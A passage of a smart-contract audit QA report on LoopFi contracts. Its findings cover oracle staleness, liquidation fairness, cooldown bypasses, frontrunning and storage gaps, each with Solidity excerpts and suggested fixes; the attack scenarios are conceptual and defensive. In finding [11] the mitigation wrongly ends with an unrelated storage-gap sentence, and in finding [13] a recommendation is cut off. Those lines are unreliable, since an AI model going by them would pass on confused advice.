| [11] | Ensure the use of a shorter stale period in production |
| [12] | Rewards could be emitted to some contracts unintentionally |
| [13] | Consider making `StakingLPEth#unstake()` and `StakingLPEth.sol` as a whole backed by pausable modifiers |
| [14] | Liquidations could be front ran |
| [15] | Consider making withdrawal of assets via `StakingLPEth#unstake()` a one step process when `cooldownDuration` is set to 0 |
| [16] | Users can be liquidated in the next block |
| [17] | Restrict calling `ChefIncentivesController#recoverERC20()` on the underlying token |
| [18] | Consider relaxing the hardcoded slippage for auto compounding |
| [19] | Consider not having Chainlink's oracle address as an immutable var |
| [20] | Setters should always have equality checkers |
| [21] | Erroneous reward tokens should not be added |
| [22] | Fix typos |
| [23] | Follow chainlink best practices and use proxy instead of price aggregator directly |
| [24] | Incorrect storage gap sizes are not advised |
| [25] | Import declarations should import specific identifiers, rather than the whole file |

## [01] `ChefIncentivesController#batchUpdateAllocPoint()` `ChefIncentivesController#_massUpdatePools()` would be broken when protocol heavily scales

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L318-L334

```solidity
function batchUpdateAllocPoint(address[] calldata _tokens, uint256[] calldata _allocPoints)
  external
  onlyOwner
{
  if (_tokens.length != _allocPoints.length) revert ArrayLengthMismatch();
  _massUpdatePools();
  uint256 _totalAllocPoint = totalAllocPoint;
  uint256 length = _tokens.length;
  for (uint256 i; i < length; ) {
    VaultInfo storage pool = vaultInfo[_tokens[i]];
    if (pool.lastRewardTime == 0) revert UnknownPool();
    _totalAllocPoint = _totalAllocPoint - pool.allocPoint + _allocPoints[i];
    pool.allocPoint = _allocPoints[i];
    unchecked {
      i++;
    }
  }
  totalAllocPoint = _totalAllocPoint;
  emit BatchAllocPointsUpdated(_tokens, _allocPoints);
}
```

Also, see the `_massUpdatePools()` function that calls:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L452-L462

```solidity
function _massUpdatePools() internal {
  uint256 totalAP = totalAllocPoint;
  uint256 length = poolLength();
  for (uint256 i; i < length; ) {
    _updatePool(vaultInfo[registeredTokens[i]], totalAP);
    unchecked {
      i++;
    }
  }
  lastAllPoolUpdate = block.timestamp;
}
```

The functions iterate through all pools to update their states. As the number of pools grows (which is expected as protocol scales), these functions may require gas that exceeds the block gas limit, rendering them unusable.

### Impact

QA, since this relies on the protocol heavily scaling and having pools to the extent where the functions fail due to OOG.

### Recommended Mitigation Steps

Consider handling a fixed number of updates per transaction.

## [02] Make `repay()` and liquidations available in the same scenario

The current logic of the `CDPVault`, allows [for the pausing of liquidations](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509), but not of repayments of debt.

Now, whereas this logic is safe and best for the user, this is extremely bad for the protocol; considering that naturally the protocol is to be set in a paused state when a black swan event occurs and until this gets sorted out it wouldn't be unpaused. Due to this, however, a very large loan that's now liquidatable and accruing bad debt can never get liquidated, because the inherited `whenNotPaused` modifier always causes it to revert.

### Impact

Protocol would be put in an unwanted state. When the Vault is paused and large loans start accruing bad debt since liquidating these loans would not work.

### Recommended Mitigation Steps

Consider removing the `whenNotPaused` from the liquidation logic.

## [03] Consider allowing price updates within the wait window if the price has moved beyond a certain threshold

When updating the price, the keeper is forced to wait for `updateWaitWindow`, even if there's been a massive jump/drop in price.

```solidity
if (block.timestamp - lastUpdate < updateWaitWindow) revert BalancerOracle__update_InUpdateWaitWindow();
```

The fixed update window prevents price updates during rapid market changes, potentially leading to the use of stale prices for an extended period.

### Impact

Borderline low/med.

### Recommended Mitigation Steps

Consider allowing price updates within the wait window if the price has moved beyond a certain threshold.

## [04] Consider having a safety buffer applied to liquidations

The [current liquidation implementation ](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509-L632) allows for a full liquidation of a position, even if repaying a little debt puts the position back afloat.

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L528-L533

```solidity
        // compute collateral to take, debt to repay and penalty to pay
        uint256 takeCollateral = wdiv(repayAmount, discountedPrice);
        uint256 deltaDebt = wmul(repayAmount, liqConfig_.liquidationPenalty);
        uint256 penalty = wmul(repayAmount, WAD - liqConfig_.liquidationPenalty);
        if (takeCollateral > position.collateral) revert CDPVault__tooHighRepayAmount();
```

The liquidator provides a `repayAmount` that covers any amount of debt, which then means that a position that just gets liquidatable even by `1%` can be fully liquidated if the liquidator can provide to [cover the full amount of collateral via the `repayAmount` var](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509).

### Impact

Borderline low/medium. Borrowers of the protocol may be unfairly liquidated due to minor movements in the market when taking out the max loan. Considering the crypto market is very volatile, in the worst case scenario, a user could be subject to a forced liquidation by the attacker by trying to exploit the spot prices returned from either uniswap/pendle.

### Recommended Mitigation Steps

Consider giving some sort of buffer like other protocols can be use here to mitigate this issue; e.g, [AAVE](https://docs.aave.com/faq/liquidations). They implement a 50% liquidation if health factor is between 0.9 to 1 and then after 0.9 full liquidation so user will have some buffer time to respond.

## [05] Potential mis-pricing when a token gets removed/deregistered from a Balancer pool

In the constructor:

```solidity
(address[] memory tokens, , ) = balancerVault.getPoolTokens(poolId);

uint256 len = tokens.length;
token0 = (len > 0) ? tokens[1] : address(0);
token1 = (len > 1) ? tokens[2] : address(0);
token2 = (len > 2) ? tokens[3] : address(0);
```

These token addresses are then used in price calculations:

```solidity
function _getTokenPrice(uint256 index) internal view returns (uint256 price) {
  address token;
  if (index == 0) token = token0;
  else if (index == 1) token = token1;
  else if (index == 2) token = token2;
  else revert BalancerOracle__getTokenPrice_invalidIndex();

  return chainlinkOracle.spot(token);
}
```

The BalancerOracle contract stores token addresses as immutable variables in the constructor. However, if a token is deregistered from the Balancer pool later, the oracle will continue to assume the old status of the pools, leading to incorrect price calculations.

### Impact

If a token is deregistered, the oracle will use outdated token addresses, resulting in incorrect price calculations and updates.

### Recommended Mitigation

Retrieve the Balancer pool tokens via `getPoolTokens()` whenever needed instead of caching them, to ensure the latest pool composition is always used.

## [06] Users can sidestep the `cooldownDuration` in an edge case

`StakingLPEth.sol` enforces a cooldown period before users can finalize withdrawals:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L88-L114

```solidity
function unstake(address receiver) external {
  UserCooldown storage userCooldown = cooldowns[msg.sender];
  uint256 assets = userCooldown.underlyingAmount;

  if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
    userCooldown.cooldownEnd = 0;
    userCooldown.underlyingAmount = 0;

    silo.withdraw(receiver, assets);
  } else {
    revert InvalidCooldown();
  }
}

/// @notice redeem assets and starts a cooldown to claim the converted underlying asset
/// @param assets assets to redeem
function cooldownAssets(uint256 assets) external ensureCooldownOn returns (uint256 shares) {
  if (assets > maxWithdraw(msg.sender)) revert ExcessiveWithdrawAmount();

  shares = previewWithdraw(assets);

  cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
  cooldowns[msg.sender].underlyingAmount += uint152(assets);

  _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
}
```

But if `cooldownDuration` is reset to 0 after a cooldown initiation, users can bypass this wait immediately. Initially, users must wait until the cooldown period ends to withdraw assets. However, resetting `cooldownDuration` to 0 allows immediate withdrawals, circumventing the intended delay.

### Impact

Users can sidestep the cooldown period if `cooldownDuration` is reset to 0, allowing immediate withdrawals despite the initial requirement to wait, compromising the protocol's risk management strategy if specifically set for these previously attempted withdrawals.

### Recommended Mitigation Steps

Modify the withdrawal condition to separately handle active cooldowns and zero `cooldownDuration`, preventing immediate withdrawals unless no cooldown is pending.

## [07] Consider not relying on an infrequently updated oracle for AURA spot pricing

The `AuraVault` contract relies on an oracle for calculating the AURA spot price, which is not updated frequently, potentially leading to inaccurate price reflections and impacting various operations within the vault.

The `_getAuraSpot` function in the `AuraVault` contract calculates the AURA spot price by fetching the time-weighted average price from a custom oracle. This oracle is not updated frequently, which leads to discrepancies between the calculated price and the actual market value of AURA.

Here we have an infrequent updates, because for Balancer/Aura oracles, the update to the price is only done whenever a transaction (e.g., `swap`) within the pool is triggered (see [here](https://etherscan.io/address/0x32296969Ef14EB0c6d29669C550D4a0449130230), for example). Due to the lack of updates, the price provided by the Oracle might not reflect the true value of the assets. Attached in the linked oracle, we can see how even for days no updates were made to the price if tx were not processed.

```solidity
function _getAuraSpot() internal view returns (uint256 price) {
  uint256 ethPrice;
  (, int256 answer, , , ) = AggregatorV3Interface(ETH_CHAINLINK_FEED).latestRoundData();
  ethPrice = wdiv(uint256(answer), ETH_CHAINLINK_DECIMALS);

  IPriceOracle.OracleAverageQuery[] memory queries = new IPriceOracle.OracleAverageQuery[](1);
  queries[0] = IPriceOracle.OracleAverageQuery(IPriceOracle.Variable.PAIR_PRICE, 1800, 0);
  uint256[] memory results = IPriceOracle(auraPriceOracle).getTimeWeightedAverage(queries);

  price = wmul(results[0], ethPrice);
}
```

### Impact

The infrequent updates to the oracle used for AURA spot price calculation can result in the price not accurately reflecting the true market value of AURA. This can affect:

- **Vault Settlement**: Inaccurate asset valuation can lead to incorrect settlement values, impacting the distribution of rewards and potentially causing losses.
- **Deleverage/Liquidation of Accounts**: Users close to the liquidation threshold might face premature deleveraging or liquidation due to undervalued assets.
- **Borrowing**: Overvaluation could allow users to borrow more than they should, based on inaccurate asset prices.

### Recommended Mitigation Steps

Consider using more frequently updated oracles, such as Chainlink/Pyth, as the primary source for price information. If a secondary oracle is needed, ensure it provides timely updates to reflect market conditions accurately.

## [08] Fallback oracles should be implemented in the `CDPVault`

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L52-L53

```solidity
    /// @notice Oracle of the collateral token
    IOracle public immutable oracle;
```

Now whenever any pricing logic is to be implemented, [this function](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L289-L291) is called: 

```solidity
function spotPrice() public view returns (uint256) {
  return oracle.spot(address(token));
}
```

However, the problem is that if anything happens to the underlying oracle then the Vault is completely bricked. For example, if the attached oracle is a Chainlink oracle that gets put down for maintenance or for change of address, the whole vault's logic that relies on pricing is broken.

### Impact

QA, due to the very low likelihood. However, if this occurs, liquidations are completely broken allowing users to accrue bad debt, so is the `modifyCollateralAndDebt()` and every other function that relies on using the spot prices.

### Recommended Mitigation Steps

Since there is already a support of multiple price providers in protocol, consider modifying `CDPVault#spotPrice()` to first try to get the price from the current/primary oracle set, then set a secondary/fallback oracle for the collateral in case the first one fails, this can easily be achieved by a try/catch logic.

To mitigate the risk associated with relying solely on a primary oracle for pricing information in the `CDPVault`, implementing a fallback oracle mechanism is crucial. This approach ensures that if the primary oracle fails or undergoes maintenance, the system can still function by relying on a secondary oracle. This fallback mechanism can be implemented using Solidity's `try`/`catch` error handling mechanism introduced in Solidity version 0.6.x.

Here's how you can modify the `spotPrice()` function in the `CDPVault.sol` contract to incorporate a fallback oracle:

```diff
contract CDPVault {

..snip
    // CDPVault Parameters
    /// @notice Oracle of the collateral token
    IOracle public immutable oracle;
+    /// @notice Secondary/fallback oracle in case the primary oracle fails
+    IOracle public immutable fallbackOracle;

..snip

    function spotPrice() public view returns (uint256) {
-        return oracle.spot(address(token));
+        // Try getting the price from the primary oracle
+        try oracle.spot(address(token)) returns (uint256 price) {
+            return price;
+        } catch {
+            // If the primary oracle call fails, fall back to the secondary oracle
+            return fallbackOracle.spot(address(token));
+        }
+    }


..snip
}
```

## [09] Configuration changes could drastically affect users and should be behind a timelock

Several configuration update actions within the protocol can negatively impact users' transactions if changes occur just prior to transaction execution.

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L304-L317

```solidity
function setLockTypeInfo(uint256[] calldata lockPeriod_, uint256[] calldata rewardMultipliers_)
  external
  onlyOwner
{
  if (lockPeriod_.length != rewardMultipliers_.length) revert InvalidLockPeriod();
  delete _lockPeriod;
  delete _rewardMultipliers;
  uint256 length = lockPeriod_.length;
  for (uint256 i; i < length; ) {
    _lockPeriod.push(lockPeriod_[i]);
    _rewardMultipliers.push(rewardMultipliers_[i]);
    unchecked {
      i++;
    }
  }
  emit LockTypeInfoUpdated(lockPeriod_, rewardMultipliers_);
}
```

This function updates the lock periods/multipliers, which could then have users committing to transactions under different terms than expected due to these configuration changes.

### Impact

Users may face unexpected terms in their transactions.

### Recommended Mitigation Steps

Allow users to specify expected configuration values as parameters. Transactions should revert if the actual configuration does not match the user-specified expectations or these changes should be applied via a timelock.

## [10] Using spot prices directly for liquidations might be unfair for users and leaves them at risk

When liquidating a position, [spot prices are used to check if indeed the position is liquidatable](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509-L575).

Spot prices in whatever provider are always the latest/easiest manipulatable point of pricing which then means that if a manipulated price is returned a user could be unfairly liquidated.

Alternatively, a malicious liquidator could take these steps using one of the decentralised providers:

- Oracle for a collateral token is set to decentralized provider.
- Liquidator manipulates the price.
- Unfairly liquidates users.

### Impact

Borderline low/medium. This seems as a design choice, but it could cause for unfair liquidations for users.

### Recommended Mitigation Steps

Consider using a TWAP logic when liquidating.

## [11] Ensure the use of a shorter stale period in production

When getting the status of the oracle there is a check used before ensuring if the status is valid or not, see [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/BalancerOracle.sol#L151-L153).

```solidity
function _getStatus() internal view returns (bool status) {
  status = (safePrice != 0) && block.timestamp - lastUpdate < stalePeriod;
}
```

However, the issue is that based on the [examination of the test files](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/test/unit/BalancerOracle.t.sol#L33-L35), the value of `stalePeriod` is planned to be `1 day` which is quite long for safe defi contexts and as such should be reconsidered and shortened.

### Impact

QA, but this could lead to an extensive use of faulty prices for a long duration.

### Recommended Mitigation Steps

Consider shortening the duration for `stalePeriod`. In this case, the contract uses one storage slot for the `oracles` mapping. Therefore, the storage gap should be adjusted to 49 instead of 50.

## [12] Rewards could be emitted to some contracts unintentionally

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L595-L616

```solidity
function handleActionAfter(
  address _user,
  uint256 _balance,
  uint256 _totalSupply
) external {
  if (!validRTokens[msg.sender] && msg.sender != address(mfd)) revert NotRTokenOrMfd();

  if (_user == address(mfd) || eligibilityExempt[_user]) {
    return;
  }
  if (eligibilityMode == EligibilityModes.FULL) {
    bool lastEligibleStatus = eligibleDataProvider.lastEligibleStatus(_user);
    bool isCurrentlyEligible = eligibleDataProvider.refresh(_user);
    if (isCurrentlyEligible) {
      if (lastEligibleStatus) {
        _handleActionAfterForToken(msg.sender, _user, _balance, _totalSupply);
      } else {
        _updateRegisteredBalance(_user);
      }
    } else {
      _processEligibility(_user, isCurrentlyEligible, true);
    }
  } else {
    _handleActionAfterForToken(msg.sender, _user, _balance, _totalSupply);
  }
}
```

This function is a hook which is used to monitor balance changes in users following certain actions (`_transfer`, `mint`, and `burn`). However, it intentionally excludes tracking balances for `rewardMinter` (the `MiddleFeeDistribution` contract) and the `MultiFeeDistribution` contract to prevent reward emissions to these contracts.

Despite this precaution, functions like `requalifyFor`, `stake`, `withdrawExpiredLocksFor`, and `withdrawExpiredLocksForWithOptions` can inadvertently include these distribution contracts if called with their addresses, bypassing the intended restriction.

### Impact

Potential oversight, which could lead to unintended reward emissions to the `MiddleFeeDistribution` and `MultiFeeDistribution` contracts, disrupting the protocol's reward distribution mechanisms and affecting its economic model.

### Recommended Mitigation Steps

Consider implementing additional safeguards or modifiers to restrict certain function calls involving these contracts directly.

## [13] Consider making `StakingLPEth#unstake()` and `StakingLPEth.sol` as a whole backed by pausable modifiers

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L88-L100

```solidity
function unstake(address receiver) external {
  UserCooldown storage userCooldown = cooldowns[msg.sender];
  uint256 assets = userCooldown.underlyingAmount;

  if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
    userCooldown.cooldownEnd = 0;
    userCooldown.underlyingAmount = 0;

    silo.withdraw(receiver, assets);
  } else {
    revert InvalidCooldown();
  }
}
```

This function is used to claim the staking amount after the cooldown has finished or if a cooldown is not set.

Now, the `setCooldownDuration()` function is used to update the cooldown duration:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L130-L139

```solidity
function setCooldownDuration(uint24 duration) external onlyOwner {
  if (duration > MAX_COOLDOWN_DURATION) {
    revert InvalidCooldown();
  }

  uint24 previousDuration = cooldownDuration;
  cooldownDuration = duration;
  emit CooldownDurationUpdated(previousDuration, cooldownDuration);
}
```

This means if there is a decision to set back a duration for cooldown in other to stop any black swan event or whatsoever users should not be allowed to sidestep this. However, the issue is since the `setCooldownDuration` function and the contract as a whole is not pausable, this allows a user to always watch the mempool after the duration is initially set to `0` for when it would be updated to a real value, allowing them to completely sidestep the duration by frontrunning the call to the `setCooldownDuration` function and withdraw without any delays.

### Impact

Likelihood is quite low, but a malicious user can frontrun the call to and sidestep the cooldown duration.

### Recommended Mitigation Steps

Consider making the contract pausable and then having the `whenNotPaused` modifier to `unstake()` this way the function could be first paused and then.

## [14] Liquidations could be frontrun

The current logic of the `CDPVault`, allows [for liquidations to be processed via two different functions](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509). However, these functions do not protect honest users that are trying to ensure the protocol is always safe; in the sense that a tech savvy user can just front run other honest users attempt at liquidating and steal their rewards.

### Impact

QA. This is a quite popular design logic, but some protocols consider a commit-reveal scheme.

### Recommended Mitigation Steps

Consider implementing a commit-reveal scheme for liquidations.

## [15] Consider making withdrawal of assets via `StakingLPEth#unstake()` a one step process when `cooldownDuration` is set to 0

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/StakingLPEth.sol#L88-L100

```solidity
function unstake(address receiver) external {
  UserCooldown storage userCooldown = cooldowns[msg.sender];
  uint256 assets = userCooldown.underlyingAmount;

  if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
    userCooldown.cooldownEnd = 0;
    userCooldown.underlyingAmount = 0;

    silo.withdraw(receiver, assets);
  } else {
    revert InvalidCooldown();
  }
}
```

The current implementation of `unstake()` requires users to first call either `cooldownAssets` or `cooldownShares` to initiate a cooldown period before they can withdraw their assets, adding an unnecessary step to the withdrawal process when the cooldownDuration is `0`. This design forces users to interact with the contract twice—once to start the cooldown and again to actually withdraw their assets—which increases transaction costs and complexity for the user.

That's to say, the `unstake` function allows withdrawals only after the cooldown period has passed or if `cooldownDuration` is set to 0, as shown in the provided code snippet. However, this process can be streamlined by integrating the cooldown initiation directly into the `unstake` function itself, eliminating the need for separate cooldown function calls.

### Impact

QA, design improvement. However, the existing process of initiating a cooldown through `cooldownAssets` or `cooldownShares` and then calling `unstake` adds unnecessary steps for users when the duration gets set to `0`.

### Recommended Mitigation Steps

Consider modifying the `unstake` function to automatically initiate the cooldown if the cooldown duration is `0`

## [16] Users can be liquidated in the next block

When [`borrowing`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L256-L265), users are allowed to provide their `collateral == debt` they want to take, since this check would then pass when modifying the position.

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L451-L455

```solidity
    function modifyCollateralAndDebt(){
        ..snip
        if (
            (deltaDebt > 0 || deltaCollateral < 0) &&
            !_isCollateralized(calcTotalDebt(_calcDebt(position)), collateralValue, config.liquidationRatio)
        ) revert CDPVault__modifyCollateralAndDebt_notSafe();

        ..snip
    }
```

However, the `iscollaterized` check would allow the hinted scenario since the check is inclusive:

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L345-L351

```solidity
function _isCollateralized(
  uint256 debt,
  uint256 collateralValue,
  uint256 liquidationRatio
) internal pure returns (bool) {
  return (wdiv(collateralValue, liquidationRatio) >= debt); //@audit qa users could be liquidatable in the next block
}
```

Which then means that users passing in `(wdiv(collateralValue, liquidationRatio) == debt` would take the debt, but can immediately be liquidatable in the next block.

### Recommended Mitigation Steps

Consider making the check strict, this way there is quite a buffer:

```diff
    function _isCollateralized(
        uint256 debt,
        uint256 collateralValue,
        uint256 liquidationRatio
    ) internal pure returns (bool) {
-        return (wdiv(collateralValue, liquidationRatio) >= debt);
+        return (wdiv(collateralValue, liquidationRatio) > debt);
    }
```

## [17] Restrict calling `ChefIncentivesController#recoverERC20()` on the underlying token

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L430-L433

```solidity
function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {
  _recoverERC20(tokenAddress, tokenAmount);
}
```

This function allows the owner to withdraw an arbitrary amount of an arbitrary ERC20 token (`tokenAddress`) and [transfer it to the `msg.sender`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/RecoverERC20.sol#L19-L22). While this functionality provides flexibility for the owner to recover funds, there is a flaw in how it handles withdrawals of the contract's underlying Token.

### Impact

QA, since the function is `onlyOwner` protected. However, since the contract's accounting is likely based on the underlying token, this withdrawal would lead to inconsistencies or incorrect accounting records.

### Recommended Mitigation Steps

Modify the `recoverERC20` function to prevent the withdrawal of the underlying token.

## [18] Consider relaxing the hardcoded slippage for auto compounding

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L41-L42

```solidity
    // Maximum slippage allowed to be set by users (used for compounding).
    uint256 public constant MAX_SLIPPAGE = 9000; //10%
```

Evidently, there is a hardcoded max as to the amount of slippage a user can set which in our case is used for [`compounding`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L41). However, this limits functionality, considering some users might want to risk more to ensure they are in the system and can auto compound.

### Impact

QA, but seems as a design choice.

### Recommended Mitigation Steps

Consider relaxing the limit, and the slippage value should be user provided so there shouldn't be any issue since this downside is acceptable to them.

## [19] Consider not having Chainlink's oracle address as an immutable var

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/BalancerOracle.sol#L23

```solidity
IOracle public immutable chainlinkOracle;
```

### Impact

Using an immutable reference for the Chainlink oracle address reduces flexibility and could lead to issues if the Chainlink oracle address needs to be updated or if it becomes compromised.

### Recommended Mitigation Steps

Replace the immutable reference with a mutable state variable and implement a function to update the Chainlink oracle address:

```diff
- IOracle public immutable chainlinkOracle;
+ IOracle public chainlinkOracle;
..snip
+function updateChainlinkOracle(address newOracle) external onlyRole(MANAGER_ROLE) {
+    require(newOracle != address(0), "Invalid oracle address");
+    chainlinkOracle = IOracle(newOracle);
+}
```

## [20] Setters should always have equality checkers

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L342-L369

```solidity
function setRewardsPerSecond(uint256 _rewardsPerSecond, bool _persist) external onlyOwner {
  _massUpdatePools();
  rewardsPerSecond = _rewardsPerSecond;
  persistRewardsPerSecond = _persist;
  emit RewardsPerSecondUpdated(_rewardsPerSecond, _persist);
}

function setScheduledRewardsPerSecond() internal {
  if (!persistRewardsPerSecond) {
    uint256 length = emissionSchedule.length;
    uint256 i = emissionScheduleIndex;
    uint128 offset = uint128(block.timestamp - startTime);
    for (; i < length && offset >= emissionSchedule[i].startTimeOffset; ) {
      unchecked {
        i++;
      }
    }
    if (i > emissionScheduleIndex) {
      emissionScheduleIndex = i;
      _massUpdatePools();
      rewardsPerSecond = uint256(emissionSchedule[i - 1].rewardsPerSecond);
    }
  }
}
```

These functions are used to make updates to already set values but there are no checks to see if the states are not the already passed in values.

### Recommended Mitigation Steps

Consider checking if the value being set is what's already stored and just skip this attempt instead.

## [21] Erroneous reward tokens should not be added

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/MultiFeeDistribution.sol#L347-L360

```solidity
function addReward(address _rewardToken) external {
  if (_rewardToken == address(0)) revert AddressZero();
  if (!minters[msg.sender]) revert InsufficientPermission();
  if (rewardData[_rewardToken].lastUpdateTime != 0) revert AlreadyAdded();
  rewardTokens.push(_rewardToken);

  Reward storage rd = rewardData[_rewardToken];
  rd.lastUpdateTime = block.timestamp;
  rd.periodFinish = block.timestamp;

  isRewardToken[_rewardToken] = true;
  emit RewardAdded(_rewardToken);
}
```

Evidently, tokens can be added to the reward emission list via the `addReward` function in either the `MultiFeeDistribution` contract by addresses with the minter role. Although these tokens are expected to be `AToken` instances or the `RDNT` token, there's no validation beyond checking against the zero address, allowing for the potential addition of incorrect tokens.

### Impact

QA, protected by the admin. However, adding an unsupported token could cause various protocol components to fail due to non-compliance with the `IAToken` interface and issues with price retrieval via the `AaveOracle`. Moreover, the inability to remove mistakenly added reward tokens necessitates an emergency upgrade to rectify the situation.

### Recommended Mitigation Steps

Implement comprehensive validation logic to prevent the addition of unsupported tokens, ensuring they conform to the required interfaces and standards.

## [22] Fix typos

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L302-L304

```solidity
/**
 * @dev Assumes 0 AURA rewards after INFLATION_PROTECTION_TIME since amount minted is unkown //@audit qa typo, should be unknown
 */
```

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L257-L258

```solidity
    /// @notice Deposits underlying tokens to the pool in exhcange for given number of pool shares
```

### Impact

Minor issue that doesn't affect functionality but may cause confusion for developers reading the code.

### Recommended Mitigation Steps

- Correct the typo from "unkown" to "unknown" in the comment.
- Correct the typo from "exhcange" to "exchange" in the second comment.

## [23] Follow chainlink best practices and use proxy instead of price aggregator directly

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/ChainlinkOracle.sol#L91-L111

```solidity
function _fetchAndValidate(address token) internal view returns (bool isValid, uint256 price) {
  Oracle memory oracle = oracles[token];
  try AggregatorV3Interface(oracle.aggregator).latestRoundData() returns (
    uint80, /*roundId*/
    int256 answer,
    uint256, /*startedAt*/
    uint256 updatedAt,
    uint80 /*answeredInRound*/
  ) {
    isValid = (answer > 0 && block.timestamp - updatedAt <= oracle.stalePeriod);
    return (isValid, wdiv(uint256(answer), oracle.aggregatorScale));
  } catch {
    // return the default values (false, 0) on failure
  }
}
```

This function fetches and validates the latest price from Chainlink; however, Chainlink recommends using the proxy and not the priceAggregator directly as a best practice.

### Impact

QA, best practice.

### Recommended Mitigation Steps

Follow the mentioned [best practices from Chainlink](https://docs.chain.link/data-feeds). You can call the `latestRoundData()` function directly on the aggregator, but it is a best practice to use the proxy instead so that changes to the aggregator do not affect your application. Similar to the proxy contract, the aggregator contract has a `latestAnswer` variable, owner address, `latestTimestamp` variable, and several others.

## [24] Incorrect storage gap sizes are not advised

Multiple instances of this; for example, see [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/PendleLPOracle.sol#L17-L45).

```solidity
contract PendleLPOracle is IOracle, AccessControlUpgradeable, UUPSUpgradeable {
    using PendleLpOracleLib for IPMarket;
    /*//////////////////////////////////////////////////////////////
                               CONSTANTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Chainlink aggregator address
    AggregatorV3Interface public immutable aggregator;
    /// @notice Stable period in seconds
    uint256 public immutable stalePeriod;
    /// @notice Aggregator decimal to WAD conversion scale
    uint256 public immutable aggregatorScale;
    /// @notice Pendle Market
    IPMarket public immutable market;
    /// @notice TWAP window in seconds
    uint32 public immutable twapWindow;
    /// @notice Pendle Pt Oracle
    IPPtOracle public immutable ptOracle;

    /*//////////////////////////////////////////////////////////////
                              STORAGE GAP
    //////////////////////////////////////////////////////////////*/

    uint256[50] private __gap;

    /*//////////////////////////////////////////////////////////////
                                 ERRORS
    //////////////////////////////////////////////////////////////*/
```

And [here](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/ChainlinkOracle.sol#L28-L34).

```solidity
    /*//////////////////////////////////////////////////////////////
                              STORAGE GAP
    //////////////////////////////////////////////////////////////*/

    uint256[50] private __gap;
```

Evidently, more than one storage slot has been used in these contracts and as such the gap `var` should reflect this.

### Impact

The incorrect storage gap size could lead to potential issues during future upgrades. If new variables are added in upgraded versions, they might overwrite the storage gap, potentially causing storage collisions and unexpected behavior.

### Recommended Mitigation Steps

Adjust the storage gap size to account for the storage slot already used in all instances where upgrades could occur.

This ensures that the total number of storage slots reserved for the contract (including both used slots and the gap) remains at 50, maintaining the intended/safe storage layout for future upgrades.

## [25] Import declarations should import specific identifiers, rather than the whole file

### Proof of Concept

